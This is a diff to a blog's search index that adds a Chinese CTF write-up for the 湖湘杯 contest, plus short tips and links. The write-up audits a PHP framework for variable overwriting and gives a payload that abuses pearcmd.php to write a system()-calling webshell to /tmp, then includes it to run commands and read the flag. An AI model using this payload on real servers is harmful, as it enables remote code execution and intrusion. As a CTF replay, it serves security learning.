@@ -4629,6 +4629,7 @@ public function __toString()&#123;
 <p><img src="/2020/10/15/x/%E5%8D%9A%E5%AE%A2%E8%A7%A3%E7%96%91/image-20211022145828373.png" alt="image-20211022145828373"></p>
 <p>6.</p>
 <p><img src="/2020/10/15/x/%E5%8D%9A%E5%AE%A2%E8%A7%A3%E7%96%91/image-20211022145852767.png" alt="image-20211022145852767"></p>
+<h3 id="phpstudy无法启动mysql"><a href="#phpstudy无法启动mysql" class="headerlink" title="phpstudy无法启动mysql"></a>phpstudy无法启动mysql</h3><p>可以在CMD中输入sc delete mysql删除掉mysql,这样就可以在phpstudy中开启MySQL了</p>
 ]]></content>
       <tags>
         <tag>博客</tag>
@@ -4876,9 +4877,56 @@ public function __toString()&#123;
       </tags>
   </entry>
   <entry>
-    <title>26</title>
+    <title>bluecms</title>
     <url>/2021/11/01/buu/26/</url>
     <content><![CDATA[<p>[<a href="https://www.shawroot.cc/1159.html">NPUCTF2020]ezinclude（PHP临时文件包含） – 「配枪朱丽叶。」 (shawroot.cc)</a></p>
+<p>bluecms：</p>
+<p><a href="https://www.cnblogs.com/BOHB-yunying/p/12643510.html">bluecms v1.6 sp1 代码审计学习 - yunying - 博客园 (cnblogs.com)</a></p>
 ]]></content>
+  </entry>
+  <entry>
+    <title>湖湘杯</title>
+    <url>/2021/11/17/ctf/%E6%B9%96%E6%B9%98%E6%9D%AF/</url>
+    <content><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>没想到直接出了一题找框架漏洞的。。</p>
+<p>赛后根据wp复现下，靶机环境为buu</p>
+<p>参考文章：<a href="https://mp.weixin.qq.com/s?srcid=11155a0DnDB8fsa6xlkV96EQ&scene=23&sharer_sharetime=1636954278368&mid=2247492365&sharer_shareid=f8efe04553108c0c98c8d775270a22ec&sn=9918645f186a2ef9c11957ed4949c27b&idx=1&__biz=MzU2NDY2OTU4Nw==&chksm=fc45def1cb3257e72196a404a9e9ea9f58d658d9d6fa4acd2a5d20c0fa380af6a2cf510f0b4e&mpshare=1#rd">第七届“湖湘杯”网络安全技能大赛WP (qq.com)</a></p>
+<h4 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h4><p><img src="/2021/11/17/ctf/%E6%B9%96%E6%B9%98%E6%9D%AF/image-20211117191742538.png" alt="image-20211117191742538"></p>
+<p>左上角有一段代码</p>
+<p><img src="/2021/11/17/ctf/%E6%B9%96%E6%B9%98%E6%9D%AF/image-20211117191827188.png" alt="image-20211117191827188"></p>
+<p>定义一个类，类中有变量name和value</p>
+<p>这里看不出什么大概，于是去官网上下载了一个相近版本的源码</p>
+<p><img src="/2021/11/17/ctf/%E6%B9%96%E6%B9%98%E6%9D%AF/image-20211117192036759.png" alt="image-20211117192036759"></p>
+<p>接下来就是代码审计</p>
+<p><img src="/2021/11/17/ctf/%E6%B9%96%E6%B9%98%E6%9D%AF/image-20211117192235252.png" alt="image-20211117192235252"></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function assign($name, $value &#x3D; null) &#123;</span><br><span class="line">	\wiphp\View::assign($name, $value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在hepler.php中找到name和value作为可控变量，那么这里就是切入点</p>
+<p>跟进</p>
+<p><img src="/2021/11/17/ctf/%E6%B9%96%E6%B9%98%E6%9D%AF/image-20211117192404636.png" alt="image-20211117192404636"></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public static function assign($name, $value &#x3D; null) &#123;</span><br><span class="line">		if ($name !&#x3D; &#39;&#39;) self::$vars[$name] &#x3D; $value;</span><br><span class="line">	&#125; </span><br></pre></td></tr></table></figure>
+
+<p>再根据view函数</p>
+<p><img src="/2021/11/17/ctf/%E6%B9%96%E6%B9%98%E6%9D%AF/image-20211117192539051.png" alt="image-20211117192539051"></p>
+<p>跟进</p>
+<p><img src="/2021/11/17/ctf/%E6%B9%96%E6%B9%98%E6%9D%AF/image-20211117192819699.png" alt="image-20211117192819699"></p>
+<p>发现变量覆盖</p>
+<p><img src="/2021/11/17/ctf/%E6%B9%96%E6%B9%98%E6%9D%AF/image-20211117192920609.png" alt="image-20211117192920609"></p>
+<p><img src="/2021/11/17/ctf/%E6%B9%96%E6%B9%98%E6%9D%AF/image-20211117192938954.png" alt="image-20211117192938954"></p>
+<p>利用漏洞，</p>
+<p>payload</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?name&#x3D;cfile&amp;+config-create+&#x2F;&amp;value&#x3D;&#x2F;usr&#x2F;local&#x2F;lib&#x2F;php&#x2F;pearcmd.php&amp;&#x2F;&lt;?&#x3D;var_dump(system($_GET[1]));?&gt;+&#x2F;tmp&#x2F;xq2.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/11/17/ctf/%E6%B9%96%E6%B9%98%E6%9D%AF/image-20211117193028604.png" alt="image-20211117193028604"></p>
+<p>写入之后就是命令执行了</p>
+<p><img src="/2021/11/17/ctf/%E6%B9%96%E6%B9%98%E6%9D%AF/image-20211117193132293.png" alt="image-20211117193132293"></p>
+<p><img src="/2021/11/17/ctf/%E6%B9%96%E6%B9%98%E6%9D%AF/image-20211117193201288.png" alt="image-20211117193201288"></p>
+<p>最后</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?name&#x3D;cfile&amp;value&#x3D;&#x2F;tmp&#x2F;xq2.txt&amp;1&#x3D;cat%20&#x2F;flag32897328937298hdwidh</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/11/17/ctf/%E6%B9%96%E6%B9%98%E6%9D%AF/image-20211117193320690.png" alt="image-20211117193320690"></p>
+]]></content>
+      <tags>
+        <tag>ctf</tag>
+      </tags>
   </entry>
 </search>
